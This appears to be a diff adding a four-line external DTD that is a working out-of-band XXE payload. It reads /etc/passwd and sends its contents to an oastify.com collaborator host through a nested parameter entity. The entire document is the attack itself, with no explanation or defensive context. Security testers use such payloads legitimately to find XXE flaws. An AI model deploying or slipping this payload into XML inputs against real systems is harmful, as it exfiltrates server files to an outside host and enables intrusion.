@@ -1,0 +1,4 @@
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "https://jj6cky4wvk2cks74lb2dfsudn4tvhp5e.oastify.com/x=%payload;">'>
+%param1;
+%external;
